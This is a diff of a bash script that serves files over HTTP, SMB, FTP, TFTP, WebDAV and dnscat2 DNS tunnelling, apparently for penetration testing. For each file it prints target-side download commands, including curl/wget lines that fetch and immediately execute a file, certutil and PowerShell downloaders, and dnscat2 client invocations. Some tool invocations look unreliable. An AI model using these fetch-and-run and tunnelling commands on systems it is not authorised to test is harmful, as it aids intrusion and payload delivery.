@@ -1,10 +1,13 @@
 #!/usr/bin/env bash
 # serve_local.sh
-# Serve current directory with goshs (foreground). Prints download commands for each real file.
+# Serve current directory with multiple protocols (HTTP, SMB, FTP, TFTP, WebDAV, DNS).
+# Prints download commands for each selected file.
 set -euo pipefail
 
 PORT=80
+WEBDAV_PORT=8080
 INTERFACE=""
+VSFTPD_CONF=""
 
 # Parse arguments
 while [[ $# -gt 0 ]]; do
@@ -23,13 +26,6 @@ while [[ $# -gt 0 ]]; do
       ;;
   esac
 done
-
-# Check if port is privileged and if user is root
-if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
-  echo "WARNING: Port $PORT is privileged and you are not root."
-  PORT=8000
-  echo "Falling back to port $PORT."
-fi
 
 # Get IP address
 get_ip() {
@@ -78,7 +74,6 @@ echo "Using interface $INTERFACE with IP: $LOCAL_IP"
 echo
 
 # Collect regular files (non-recursive) in current directory
-# Handles filenames with spaces/newlines safely by using NUL separators
 mapfile -t FILES < <(find . -maxdepth 1 -type f -print0 | xargs -0 -n1 -I{} basename "{}" 2>/dev/null || true)
 
 if [[ ${#FILES[@]} -eq 0 ]]; then
@@ -117,31 +112,59 @@ while true; do
   echo "  [2] Windows"
   read -p "Enter number to select OS: " os_selection
   case "$os_selection" in
-    1)
-      TARGET_OS="Linux"
-      break
-      ;;
-    2)
-      TARGET_OS="Windows"
-      break
-      ;;
-    *)
-      echo "Invalid selection. Please enter 1 or 2."
-      ;;
+    1) TARGET_OS="Linux"; break ;;
+    2) TARGET_OS="Windows"; break ;;
+    *) echo "Invalid selection. Please enter 1 or 2." ;;
   esac
 done
 echo "Selected OS: $TARGET_OS"
 echo
 
+# Protocol Selection logic
+PROTOCOL=""
+while true; do
+  echo "Select Protocol:"
+  echo "  [1] HTTP only"
+  echo "  [2] SMB only"
+  echo "  [3] FTP only"
+  echo "  [4] TFTP only"
+  echo "  [5] WebDAV only"
+  echo "  [6] DNS (dnscat2) only"
+  echo "  [7] ALL Protocols (HTTP, SMB, FTP, TFTP, WebDAV, DNS)"
+  read -p "Enter number to select protocol: " proto_selection
+  case "$proto_selection" in
+    1) PROTOCOL="HTTP"; break ;;
+    2) PROTOCOL="SMB"; break ;;
+    3) PROTOCOL="FTP"; break ;;
+    4) PROTOCOL="TFTP"; break ;;
+    5) PROTOCOL="WebDAV"; break ;;
+    6) PROTOCOL="DNS"; break ;;
+    7) PROTOCOL="ALL"; break ;;
+    *) echo "Invalid selection. Please enter 1-7." ;;
+  esac
+done
+echo "Selected Protocol: $PROTOCOL"
+echo
+
+# Port and privilege checks
+if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+  if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
+    echo "WARNING: Port $PORT is privileged and you are not root."
+    PORT=8000
+    echo "Falling back to port $PORT for HTTP."
+  fi
+fi
+
+if [[ "$PROTOCOL" != "HTTP" && "$PROTOCOL" != "WebDAV" ]] && [[ "$EUID" -ne 0 ]]; then
+  echo "WARNING: SMB (445), FTP (21), TFTP (69), and DNS (53) usually require root privileges."
+fi
+
 # Print download commands per file
 echo "========== Download commands (per file) =========="
 if [[ ${#SELECTED_FILES[@]} -eq 0 ]]; then
-  echo "No files to print commands for. You can still browse the directory index at http://$LOCAL_IP:$PORT/"
+  echo "No files to print commands for."
 else
   for f in "${SELECTED_FILES[@]}"; do
-    # URL-encode minimal characters for space -> %20 (safe enough for typical filenames)
-    # A simple URL-escape for spaces and a few common chars:
-    # IMPORTANT: Encode % first to avoid double-encoding!
     url_encoded="${f//%/%25}"
     url_encoded="${url_encoded//#/%23}"
     url_encoded="${url_encoded// /%20}"
@@ -149,41 +172,169 @@ else
     echo "File: $f"
     
     if [[ "$TARGET_OS" == "Linux" ]]; then
-      echo "  Linux:"
-      echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
-      echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
+      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (HTTP):"
+        echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
+        echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
+      fi
+      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (SMB):"
+        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\""
+      fi
+      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (FTP):"
+        echo "    curl -u anonymous: \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
+        echo "    wget \"ftp://$LOCAL_IP/$url_encoded\" -O \"$f\""
+      fi
+      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (TFTP):"
+        echo "    tftp $LOCAL_IP -c get \"$f\""
+      fi
+      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (WebDAV):"
+        echo "    curl -s \"http://$LOCAL_IP:$WEBDAV_PORT/$url_encoded\" -o \"$f\""
+        echo "    cadaver http://$LOCAL_IP:$WEBDAV_PORT/"
+      fi
+      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (DNS/dnscat2):"
+        echo "    dnscat2 --dns server=$LOCAL_IP,port=53"
+        echo "    (In session: download \"$f\")"
+      fi
     elif [[ "$TARGET_OS" == "Windows" ]]; then
-      echo "  Windows (CMD):"
-      echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
-      echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
-      echo "    bitsadmin /transfer dl \"http://$LOCAL_IP:$PORT/$url_encoded\" \"%CD%\\$f\""
-      echo
-      echo "  Windows (PowerShell):"
-      echo "    PowerShell -Command \"Invoke-WebRequest -Uri 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
-      echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$LOCAL_IP:$PORT/$url_encoded',''$f'')\""
-      echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (HTTP):"
+        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
+        echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
+        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+      fi
+      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (SMB):"
+        echo "    copy \"\\\\$LOCAL_IP\\share\\$f\" ."
+      fi
+      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (FTP):"
+        echo "    curl \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
+        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f')\""
+      fi
+      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (TFTP):"
+        echo "    tftp -i $LOCAL_IP GET \"$f\""
+      fi
+      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (WebDAV):"
+        echo "    copy \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f\" ."
+        echo "    net use Z: http://$LOCAL_IP:$WEBDAV_PORT/"
+      fi
+      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (DNS/dnscat2):"
+        echo "    dnscat2.exe --dns server=$LOCAL_IP,port=53"
+        echo "    (In session: download \"$f\")"
+      fi
     fi
   done
 fi
 
 echo
 echo "=============================================="
-echo "Starting goshs server on port $PORT (foreground)"
-echo "Serving directory: $(pwd)"
-echo "URL: http://$LOCAL_IP:$PORT/"
-echo "(Press Ctrl+C to stop)"
-echo "=============================================="
-echo
+echo "Starting server(s)..."
 
-# Start server (prefer goshs, fallback to python3)
-if command -v goshs >/dev/null 2>&1; then
-  echo "Starting goshs server on port $PORT (foreground)"
-  exec goshs -p "$PORT"
-elif command -v python3 >/dev/null 2>&1; then
-  echo "WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'."
-  echo "Starting python3 server on port $PORT (foreground)"
-  exec python3 -m http.server "$PORT"
-else
-  echo "ERROR: Neither 'goshs' nor 'python3' was found in PATH."
-  exit 1
-fi
+cleanup() {
+  echo "Cleaning up..."
+  kill $(jobs -p) 2>/dev/null || true
+  [[ -n "$VSFTPD_CONF" && -f "$VSFTPD_CONF" ]] && rm -f "$VSFTPD_CONF"
+}
+trap cleanup EXIT
+
+start_http() {
+  if command -v goshs >/dev/null 2>&1; then
+    echo "Starting goshs server on port $PORT"
+    goshs -p "$PORT"
+  elif command -v python3 >/dev/null 2>&1; then
+    echo "WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'."
+    echo "Starting python3 server on port $PORT"
+    python3 -m http.server "$PORT"
+  else
+    echo "ERROR: Neither 'goshs' nor 'python3' was found in PATH."
+    return 1
+  fi
+}
+
+start_smb() {
+  if command -v impacket-smbserver >/dev/null 2>&1; then
+    echo "Starting impacket-smbserver (share: share, path: $(pwd))"
+    impacket-smbserver share "$(pwd)" -smb2support
+  elif command -v smbserver.py >/dev/null 2>&1; then
+    echo "Starting smbserver.py (share: share, path: $(pwd))"
+    smbserver.py share "$(pwd)" -smb2support
+  else
+    echo "ERROR: 'impacket-smbserver' not found. (pip install impacket)"
+    return 1
+  fi
+}
+
+start_ftp() {
+  if command -v vsftpd >/dev/null 2>&1; then
+    VSFTPD_CONF="/tmp/vsftpd.conf.$$"
+    echo "listen=YES
+anonymous_enable=YES
+anon_root=$(pwd)
+no_anon_password=YES
+write_enable=NO
+pasv_enable=YES
+background=NO
+seccomp_sandbox=NO" > "$VSFTPD_CONF"
+    echo "Starting vsftpd on port 21 (anonymous root: $(pwd))"
+    vsftpd "$VSFTPD_CONF"
+  else
+    echo "ERROR: 'vsftpd' not found. (apt install vsftpd)"
+    return 1
+  fi
+}
+
+start_tftp() {
+  if command -v atftpd >/dev/null 2>&1; then
+    echo "Starting atftpd on port 69 (foreground, path: $(pwd))"
+    atftpd --daemon --port 69 --no-fork "$(pwd)"
+  else
+    echo "ERROR: 'atftpd' not found. (apt install atftpd)"
+    return 1
+  fi
+}
+
+start_webdav() {
+  if command -v rclone >/dev/null 2>&1; then
+    echo "Starting rclone WebDAV on port $WEBDAV_PORT"
+    rclone serve webdav "$(pwd)" --addr ":$WEBDAV_PORT"
+  else
+    echo "ERROR: 'rclone' not found. (apt install rclone)"
+    return 1
+  fi
+}
+
+start_dns() {
+  if command -v dnscat2 >/dev/null 2>&1; then
+    echo "Starting dnscat2 DNS server on port 53"
+    dnscat2 --dns server=$LOCAL_IP,port=53 --no-cache
+  else
+    echo "ERROR: 'dnscat2' not found. (apt install dnscat2)"
+    return 1
+  fi
+}
+
+case "$PROTOCOL" in
+  HTTP)   start_http ;;
+  SMB)    start_smb ;;
+  FTP)    start_ftp ;;
+  TFTP)   start_tftp ;;
+  WebDAV) start_webdav ;;
+  DNS)    start_dns ;;
+  ALL)
+    echo "Attempting to start all servers..."
+    (start_http || true) &
+    (start_smb || true) &
+    (start_ftp || true) &
+    (start_tftp || true) &
+    (start_webdav || true) &
+    start_dns || { echo "WARNING: Foreground DNS server (dnscat2) could not start or was exited. Waiting for background servers..."; wait; }
+    ;;
+esac
